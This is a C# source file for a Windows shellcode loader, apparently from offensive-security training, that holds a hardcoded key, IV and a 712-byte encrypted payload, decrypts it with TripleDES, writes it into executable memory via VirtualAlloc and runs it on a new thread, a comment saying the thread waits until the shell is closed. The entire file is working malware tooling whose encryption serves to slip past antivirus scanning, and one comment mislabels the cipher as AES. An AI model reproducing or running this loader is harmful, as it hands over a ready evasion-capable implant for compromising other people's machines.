using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace StayAwhile
{
    class AndListen
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var tripledes = TripleDES.Create())
            {
                tripledes.KeySize = 192;
                tripledes.BlockSize = 64;

                // Keep this in mind when you view your decrypted content as the size will likely be different.
                tripledes.Padding = PaddingMode.Zeros;
                tripledes.Key = key;
                tripledes.IV = iv;

                using (var decryptor = tripledes.CreateDecryptor(tripledes.Key, tripledes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            // Key bytes
            byte[] Says = new byte[24] {
                0x1d, 0x6e, 0x65, 0xa3, 0xc3, 0x18, 0x73, 0xe5, 0x07, 0x4c, 0xc0, 0x15, 0x55, 0xa7, 0x88,
                0xa9, 0xa8, 0xa9, 0xd3, 0x53, 0xa8, 0x2f, 0x41, 0xd4 };

            // IV bytes
            byte[] Try = new byte[8] {
                0xf6, 0xa9, 0x46, 0x58, 0x09, 0xc6, 0xff, 0x37 };

            // AES 128-bit encrypted shellcode
            byte[] OffSec = new byte[712] {
                0xc0, 0xfd, 0x11, 0x52, 0x1d, 0x3e, 0x20, 0x99, 0xea, 0x71, 0xe6, 0x02, 0xea, 0x64, 0xb0,
                0x8a, 0xb6, 0x85, 0x1b, 0x40, 0xf2, 0x18, 0x1b, 0xe2, 0x94, 0x97, 0xd2, 0x4f, 0x2b, 0x11,
                0x0e, 0x41, 0xd0, 0x85, 0x4d, 0x28, 0xd8, 0x82, 0x91, 0x65, 0x57, 0x63, 0x25, 0xa6, 0x07,
                0xd2, 0xdd, 0x6d, 0xfd, 0xf3, 0xff, 0xae, 0x86, 0x1b, 0x6c, 0xc6, 0xe1, 0xcd, 0xde, 0xcf,
                0x3d, 0xcd, 0x6f, 0x28, 0xee, 0xde, 0x0b, 0xd7, 0x80, 0x6b, 0x91, 0x35, 0xb2, 0x2d, 0xf4,
                0xd1, 0x6b, 0x6d, 0xa2, 0x66, 0x31, 0x14, 0x7e, 0xb3, 0x26, 0xe2, 0x69, 0x7e, 0x44, 0x02,
                0x6f, 0x99, 0x41, 0x68, 0xc2, 0x55, 0x68, 0xa2, 0x66, 0xf7, 0x70, 0xd7, 0x8c, 0xbd, 0x2e,
                0xf9, 0x1f, 0x97, 0x6e, 0x83, 0x5c, 0xd7, 0x61, 0x0c, 0x13, 0x55, 0xab, 0x49, 0xf5, 0x3e,
                0x69, 0x7b, 0xe3, 0x92, 0xfe, 0x9b, 0x94, 0xfb, 0x23, 0x06, 0x52, 0x02, 0x33, 0xa8, 0x45,
                0xbc, 0xa7, 0xb1, 0xfb, 0x14, 0x3d, 0xe7, 0x5d, 0x71, 0x30, 0x07, 0xca, 0xa1, 0x54, 0xca,
                0x67, 0x90, 0x4c, 0xf0, 0x73, 0x5d, 0xed, 0x11, 0x6b, 0x54, 0x5d, 0xe2, 0x25, 0x51, 0xe7,
                0x33, 0xfd, 0x4d, 0xcf, 0x09, 0x91, 0xc3, 0xfe, 0xcc, 0x0f, 0x8f, 0xf4, 0x84, 0x90, 0x30,
                0xf3, 0xce, 0x87, 0xc0, 0xb5, 0xcb, 0x2f, 0xb5, 0x16, 0x86, 0xfb, 0x8c, 0x2c, 0xa6, 0x9a,
                0x74, 0xf3, 0x69, 0x96, 0x5a, 0xe6, 0x6a, 0x93, 0x14, 0x52, 0x5e, 0x76, 0x62, 0x23, 0x1b,
                0xd2, 0xa9, 0x3c, 0x3c, 0x9a, 0x5d, 0xaa, 0x92, 0xb9, 0x20, 0xdb, 0xa3, 0xa0, 0xd8, 0x4f,
                0xed, 0xe0, 0xef, 0xef, 0xa6, 0x7e, 0xd7, 0x9a, 0x22, 0xe0, 0x24, 0x4f, 0x10, 0xec, 0x19,
                0xf4, 0x48, 0x3b, 0x95, 0xa4, 0x86, 0x5e, 0xed, 0xfe, 0x02, 0x6d, 0x5e, 0x3f, 0x50, 0x04,
                0x72, 0x63, 0x36, 0xef, 0xd1, 0x75, 0x53, 0x64, 0x69, 0x83, 0x40, 0x9b, 0x39, 0x5b, 0x70,
                0xea, 0xf0, 0x29, 0x33, 0xd8, 0xff, 0x81, 0x22, 0x62, 0x9c, 0x5e, 0xb2, 0xaa, 0x27, 0x03,
                0x02, 0x2d, 0x55, 0x2f, 0x1a, 0xf7, 0xa0, 0xd2, 0x92, 0x68, 0x52, 0x47, 0xb7, 0xbb, 0x57,
                0xc2, 0x11, 0x96, 0x2f, 0x86, 0x4b, 0x95, 0x56, 0x2e, 0xa5, 0xdb, 0x13, 0x61, 0xb4, 0x0c,
                0x2e, 0x63, 0x43, 0x7e, 0xf5, 0x8a, 0x92, 0x52, 0x0f, 0xfa, 0xc2, 0x9d, 0xdf, 0x1c, 0x27,
                0xb3, 0x47, 0x5a, 0x1c, 0x53, 0x78, 0x52, 0x21, 0x7a, 0xc3, 0x8e, 0x3a, 0x83, 0xf1, 0xcd,
                0xeb, 0x42, 0x1e, 0x97, 0xd2, 0x1a, 0x56, 0xe4, 0x72, 0xbd, 0x2b, 0x6a, 0xd8, 0x81, 0x9a,
                0x9b, 0x56, 0x2e, 0x17, 0xa1, 0x98, 0x3d, 0x56, 0xdd, 0x3a, 0x38, 0x29, 0x13, 0x26, 0x52,
                0xb6, 0xc8, 0x15, 0x4c, 0x17, 0xbc, 0x8b, 0xb6, 0xb2, 0xfd, 0xc6, 0x1a, 0x21, 0x37, 0x11,
                0xd6, 0xe9, 0xd2, 0x82, 0xc8, 0xc1, 0x73, 0xe5, 0xa2, 0x63, 0x6a, 0x1c, 0xc5, 0xd0, 0x99,
                0x19, 0x6f, 0x2e, 0xf1, 0xd0, 0x44, 0x41, 0xc9, 0x1e, 0xd4, 0x40, 0xbd, 0x14, 0x80, 0xf5,
                0x75, 0xad, 0xcd, 0x59, 0x22, 0xe6, 0x57, 0x4b, 0xe8, 0x41, 0xb9, 0x8d, 0x95, 0xae, 0xe6,
                0x2a, 0x4d, 0x7f, 0x54, 0x79, 0xdb, 0x05, 0xab, 0x13, 0x41, 0xd8, 0xb5, 0xc7, 0x9b, 0x8e,
                0x0c, 0x5a, 0x52, 0x8e, 0x7b, 0x28, 0xce, 0x82, 0xce, 0x68, 0x8e, 0x84, 0x2e, 0x24, 0xb7,
                0x1c, 0xa8, 0xe3, 0x0b, 0xbf, 0xa9, 0xd2, 0x4b, 0x11, 0xac, 0x68, 0x5a, 0xfc, 0x6f, 0x8b,
                0xe5, 0x08, 0xb4, 0x64, 0x44, 0x75, 0xf3, 0xef, 0x9b, 0xec, 0xa4, 0x17, 0x9f, 0xd1, 0x53,
                0x58, 0xd9, 0x26, 0xf8, 0x15, 0x18, 0xb5, 0x5d, 0xf5, 0x5c, 0x3b, 0x9e, 0x0f, 0x69, 0xed,
                0x63, 0x88, 0xbb, 0x63, 0x90, 0xe4, 0xca, 0xed, 0x23, 0xf1, 0x4d, 0x5e, 0x06, 0x4d, 0x40,
                0x7e, 0x33, 0x71, 0x5f, 0x66, 0x3d, 0x00, 0xaf, 0x83, 0x35, 0xc4, 0x1a, 0xe7, 0x51, 0x6b,
                0x27, 0x56, 0xf8, 0x57, 0x98, 0xc9, 0x89, 0x48, 0x1f, 0xe4, 0x16, 0x14, 0x3a, 0x8a, 0xc5,
                0x64, 0x1b, 0x4d, 0x66, 0x4c, 0x47, 0x02, 0x0d, 0xdf, 0x07, 0x36, 0x35, 0x8f, 0xf4, 0x14,
                0x03, 0x7d, 0xa4, 0xe3, 0x2b, 0xb8, 0x08, 0x95, 0x0a, 0xab, 0x05, 0xd5, 0x8f, 0xff, 0x02,
                0xcc, 0xa6, 0xb0, 0x6a, 0x2c, 0xda, 0xff, 0x99, 0x50, 0xbf, 0x37, 0x3a, 0xa7, 0x16, 0xc6,
                0x2f, 0xa7, 0xe6, 0x07, 0x07, 0x56, 0xfd, 0xe2, 0x9c, 0x9c, 0x27, 0xfe, 0x46, 0xc5, 0x1d,
                0x2c, 0x55, 0x23, 0x0d, 0x8b, 0xd9, 0x59, 0xe8, 0x5d, 0x90, 0x52, 0x14, 0xdc, 0x8e, 0x27,
                0x22, 0x7f, 0x4c, 0x27, 0x0d, 0xca, 0x42, 0xf7, 0x5b, 0xd8, 0xd8, 0xd7, 0x0f, 0x27, 0x1f,
                0x98, 0x49, 0x9f, 0xa7, 0x49, 0xd8, 0x04, 0xac, 0xe5, 0xd1, 0xc6, 0xe7, 0x24, 0xa5, 0x70,
                0x63, 0x75, 0x99, 0xf2, 0x22, 0x90, 0x22, 0xf8, 0xc2, 0x5e, 0x33, 0xdb, 0x27, 0x17, 0x22,
                0xed, 0x32, 0x75, 0x8d, 0x73, 0x8d, 0xc4, 0xe1, 0x83, 0xde, 0x6e, 0xd2, 0x84, 0xbe, 0x6c,
                0x46, 0xe8, 0x6f, 0x62, 0xdc, 0x40, 0x3e, 0xd2, 0xd3, 0x05, 0x43, 0x73, 0x55, 0xca, 0x55,
                0x2a, 0x8b, 0x3e, 0xc3, 0x90, 0x51, 0x3d };

            // Decrypt our shellcode
            var crypto = new AndListen();
            byte[] Harder = crypto.Decrypt(OffSec, Says, Try);
            int size = Harder.Length;

            // Allocate our memory buffer
            IntPtr va = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Copy of decrypted shellcode into the buffer
            Marshal.Copy(Harder, 0, va, size);

            // Create a thread that contains our buffer
            IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);

            // Ensure our thread doesn't exit until we close our shell
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}

